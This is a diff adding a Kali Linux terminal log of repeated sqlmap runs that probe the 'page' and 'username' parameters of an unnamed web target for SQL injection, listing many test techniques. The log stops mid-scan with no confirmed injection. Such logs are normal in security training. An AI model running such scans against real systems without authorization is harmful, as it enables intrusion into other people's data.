@@ -1,0 +1,688 @@
+                                                                           ┌──(kali㉿kali)-[~]
+└─$ sqlmap
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.6#stable}
+|_ -| . [,]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+Usage: python3 sqlmap [options]
+
+sqlmap: error: missing a mandatory option (-d, -u, -l, -m, -r, -g, -c, --wizard, --shell, --update, --purge, --list-tampers or --dependencies). Use -h for basic and -hh for advanced help
+
+                                               
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -r /root/Desktop/extract.txt --dbs
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.6#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 07:11:23 /2022-04-15/
+
+[07:11:23] [CRITICAL] specified HTTP request file '/root/Desktop/extract.txt' does not exist
+
+[*] ending @ 07:11:23 /2022-04-15/
+
+                                               
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -r /home/kali/Desktop/extract.txt --dbs
+        ___
+       __H__                                   
+ ___ ___[,]_____ ___ ___  {1.6#stable}         
+|_ -| . [(]     | .'| . |                      
+|___|_  [.]_|_|_|__,|  _|                      
+      |_|V...       |_|   https://sqlmap.org   
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 07:12:45 /2022-04-15/
+
+[07:12:45] [INFO] parsing HTTP request from '/home/kali/Desktop/extract.txt'                  
+[07:12:46] [INFO] testing connection to the target URL
+[07:12:49] [INFO] checking if the target is protected by some kind of WAF/IPS
+[07:12:51] [INFO] testing if the target URL content is stable
+[07:12:53] [INFO] target URL content is stable
+[07:12:53] [INFO] testing if GET parameter 'page' is dynamic                                  
+[07:12:55] [INFO] GET parameter 'page' appears to be dynamic
+[07:12:56] [WARNING] heuristic (basic) test shows that GET parameter 'page' might not be injectable
+[07:12:58] [INFO] heuristic (XSS) test shows that GET parameter 'page' might be vulnerable to cross-site scripting (XSS) attacks
+[07:12:59] [INFO] heuristic (FI) test shows that GET parameter 'page' might be vulnerable to file inclusion (FI) attacks
+[07:12:59] [INFO] testing for SQL injection on GET parameter 'page'
+[07:12:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                  
+[07:13:01] [WARNING] reflective value(s) found and filtering out
+[07:13:07] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'          
+[07:13:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                         
+[07:13:10] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'               
+[07:13:11] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                        
+[07:13:13] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'         
+[07:13:15] [INFO] testing 'Generic inline queries'                                            
+[07:13:15] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                        
+[07:13:15] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[07:13:16] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'             
+[07:13:17] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'      
+[07:13:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                
+[07:13:20] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'                             
+[07:13:21] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'                 
+[07:13:23] [INFO] testing 'Oracle AND time-based blind'                                       
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
+[07:13:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'                      
+[07:13:53] [WARNING] GET parameter 'page' does not seem to be injectable
+[07:13:53] [INFO] testing if GET parameter 'username' is dynamic                              
+[07:13:54] [WARNING] GET parameter 'username' does not appear to be dynamic
+[07:13:54] [INFO] heuristic (basic) test shows that GET parameter 'username' might be injectable (possible DBMS: 'PostgreSQL or MySQL')
+[07:13:54] [INFO] heuristic (XSS) test shows that GET parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
+[07:13:55] [INFO] testing for SQL injection on GET parameter 'username'
+it looks like the back-end DBMS is 'PostgreSQL or MySQL'. Do you want to skip test payloads sp
+for the remaining tests, do you want to include all tests for 'PostgreSQL or MySQL' extending provided level (1) and risk (1) values? [Y/n] y
+[07:14:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                  
+[07:14:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'          
+[07:14:34] [INFO] testing 'Generic inline queries'                                            
+[07:14:35] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[07:15:03] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)' 
+n
+[07:15:27] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[07:15:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
+[07:15:29] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
+[07:15:30] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'                                                                                 
+[07:15:31] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[07:15:32] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+[07:15:34] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
+[07:15:35] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[07:15:53] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
+[07:16:11] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[07:16:28] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
+[07:16:40] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[07:16:41] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
+[07:16:41] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
+[07:16:42] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
+[07:16:42] [INFO] testing 'PostgreSQL inline queries'
+[07:16:43] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[07:16:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[07:17:01] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[07:17:08] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
+[07:17:19] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[07:17:24] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
+[07:17:33] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[07:17:47] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
+[07:18:01] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
+[07:18:10] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
+[07:18:20] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
+[07:18:34] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
+[07:18:48] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
+[07:18:58] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
+[07:19:08] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
+[07:19:08] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
+[07:19:08] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
+[07:19:09] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
+[07:19:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[07:19:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[07:19:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[07:19:55] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'                                                                                          
+[07:20:22] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                                                                 
+[07:20:51] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                                                                  
+[07:21:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                                                                      
+[07:21:42] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                                                                       
+[07:22:03] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                                                                 
+[07:22:32] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                                                                  
+[07:22:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+[07:22:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'                                                                                             
+[07:22:55] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
+[07:22:56] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
+[07:22:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
+[07:22:58] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'                                                                                             
+[07:22:58] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[07:23:00] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                                                         
+[07:23:01] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[07:23:01] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                                                          
+[07:23:01] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
+[07:23:19] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
+[07:23:19] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                           
+[07:23:36] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[07:23:52] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                                                       
+[07:24:08] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[07:24:25] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                                                               
+[07:24:41] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[07:24:57] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                                                               
+[07:25:14] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[07:25:30] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                     
+[07:25:50] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                      
+[07:26:07] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                              
+[07:26:23] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                               
+[07:26:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                                                 
+[07:27:00] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                                                  
+^Z
+zsh: suspended  sqlmap -r /home/kali/Desktop/extract.txt --dbs
+                                                                                                 
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -r /home/kali/Desktop/extract.txt --dbs
+        ___
+       __H__                                                                                     
+ ___ ___[.]_____ ___ ___  {1.6#stable}                                                           
+|_ -| . [.]     | .'| . |                                                                        
+|___|_  ["]_|_|_|__,|  _|                                                                        
+      |_|V...       |_|   https://sqlmap.org                                                     
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 07:27:16 /2022-04-15/
+
+[07:27:16] [INFO] parsing HTTP request from '/home/kali/Desktop/extract.txt'
+[07:27:16] [INFO] testing connection to the target URL
+[07:27:19] [INFO] checking if the target is protected by some kind of WAF/IPS
+[07:27:21] [INFO] testing if the target URL content is stable
+[07:27:22] [INFO] target URL content is stable
+[07:27:22] [INFO] testing if GET parameter 'page' is dynamic
+[07:27:24] [INFO] GET parameter 'page' appears to be dynamic
+[07:27:26] [WARNING] heuristic (basic) test shows that GET parameter 'page' might not be injectable
+[07:27:28] [INFO] heuristic (XSS) test shows that GET parameter 'page' might be vulnerable to cross-site scripting (XSS) attacks
+[07:27:28] [INFO] heuristic (FI) test shows that GET parameter 'page' might be vulnerable to file inclusion (FI) attacks
+[07:27:28] [INFO] testing for SQL injection on GET parameter 'page'
+[07:27:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[07:27:31] [WARNING] reflective value(s) found and filtering out
+[07:27:37] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[07:27:38] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                              
+[07:27:40] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[07:27:41] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                                             
+[07:27:43] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[07:27:45] [INFO] testing 'Generic inline queries'
+[07:27:45] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[07:27:45] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[07:27:46] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[07:27:47] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[07:27:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[07:27:50] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[07:27:51] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[07:27:52] [INFO] testing 'Oracle AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
+[07:29:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+^Z
+zsh: suspended  sqlmap -r /home/kali/Desktop/extract.txt --dbs
+                                                                                                 
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -r /home/kali/Desktop/extract.txt --dbs
+        ___
+       __H__                                                                                     
+ ___ ___[(]_____ ___ ___  {1.6#stable}                                                           
+|_ -| . [,]     | .'| . |                                                                        
+|___|_  [)]_|_|_|__,|  _|                                                                        
+      |_|V...       |_|   https://sqlmap.org                                                     
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 07:30:10 /2022-04-15/
+
+[07:30:10] [INFO] parsing HTTP request from '/home/kali/Desktop/extract.txt'
+[07:30:11] [INFO] testing connection to the target URL
+[07:30:13] [INFO] checking if the target is protected by some kind of WAF/IPS
+[07:30:15] [INFO] testing if the target URL content is stable
+[07:30:17] [INFO] target URL content is stable
+[07:30:17] [INFO] testing if GET parameter 'page' is dynamic
+[07:30:19] [INFO] GET parameter 'page' appears to be dynamic
+[07:30:21] [WARNING] heuristic (basic) test shows that GET parameter 'page' might not be injectable
+[07:30:23] [INFO] heuristic (XSS) test shows that GET parameter 'page' might be vulnerable to cross-site scripting (XSS) attacks
+[07:30:23] [INFO] heuristic (FI) test shows that GET parameter 'page' might be vulnerable to file inclusion (FI) attacks
+[07:30:23] [INFO] testing for SQL injection on GET parameter 'page'
+[07:30:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[07:30:25] [WARNING] reflective value(s) found and filtering out
+[07:30:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[07:30:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                              
+[07:30:35] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[07:30:37] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                                             
+[07:30:38] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[07:30:40] [INFO] testing 'Generic inline queries'
+[07:30:40] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[07:30:40] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[07:30:41] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[07:30:42] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[07:30:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[07:30:45] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[07:30:46] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[07:30:48] [INFO] testing 'Oracle AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
+[07:32:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[07:32:40] [WARNING] GET parameter 'page' does not seem to be injectable
+[07:32:40] [INFO] testing if GET parameter 'username' is dynamic
+[07:32:40] [WARNING] GET parameter 'username' does not appear to be dynamic
+[07:32:40] [INFO] heuristic (basic) test shows that GET parameter 'username' might be injectable (possible DBMS: 'PostgreSQL or MySQL')
+[07:32:40] [INFO] heuristic (XSS) test shows that GET parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
+[07:32:41] [INFO] testing for SQL injection on GET parameter 'username'
+it looks like the back-end DBMS is 'PostgreSQL or MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'PostgreSQL or MySQL' extending provided level (1) and risk (1) values? [Y/n] y
+[07:33:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[07:33:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[07:33:19] [INFO] testing 'Generic inline queries'
+[07:33:19] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[07:33:47] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[07:34:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[07:34:11] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
+[07:34:12] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
+[07:34:13] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'                                                                                 
+[07:34:13] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[07:34:15] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+[07:34:16] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
+[07:34:18] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[07:34:37] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
+[07:34:55] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[07:35:11] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
+[07:35:24] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[07:35:24] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
+[07:35:24] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
+[07:35:25] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
+[07:35:26] [INFO] testing 'PostgreSQL inline queries'
+[07:35:26] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[07:35:33] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[07:35:44] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[07:35:51] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
+[07:36:02] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[07:36:07] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
+[07:36:16] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[07:36:30] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
+[07:36:44] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
+[07:36:53] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
+[07:37:03] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
+[07:37:18] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
+[07:37:31] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
+[07:37:41] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
+[07:37:51] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
+[07:37:51] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
+[07:37:51] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
+[07:37:52] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
+[07:37:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[07:38:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[07:38:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[07:38:36] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'                                                                                          
+[07:39:03] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                                                                 
+[07:39:32] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                                                                  
+[07:39:54] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                                                                      
+[07:40:23] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                                                                       
+[07:40:45] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                                                                 
+[07:41:14] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                                                                  
+[07:41:35] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+[07:41:36] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'                                                                                             
+[07:41:37] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
+[07:41:38] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
+[07:41:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
+[07:41:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'                                                                                             
+[07:41:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[07:41:42] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                                                         
+[07:41:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[07:41:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                                                          
+[07:41:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
+[07:42:01] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
+[07:42:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                           
+[07:42:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[07:42:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                                                       
+[07:42:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[07:43:06] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                                                               
+[07:43:24] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[07:43:42] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                                                               
+[07:43:58] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[07:44:15] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                     
+[07:44:31] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                      
+[07:44:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                              
+[07:45:04] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                               
+[07:45:20] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                                                 
+[07:45:37] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                                                  
+[07:45:53] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                     
+[07:46:10] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[07:46:27] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[07:46:35] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[07:46:46] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[07:46:47] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[07:46:47] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[07:46:47] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[07:46:48] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[07:46:48] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[07:46:48] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[07:46:49] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
+[07:46:49] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
+[07:46:50] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
+[07:46:50] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
+[07:46:51] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[07:46:52] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
+[07:46:52] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
+[07:46:53] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[07:46:53] [INFO] testing 'MySQL inline queries'
+[07:46:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
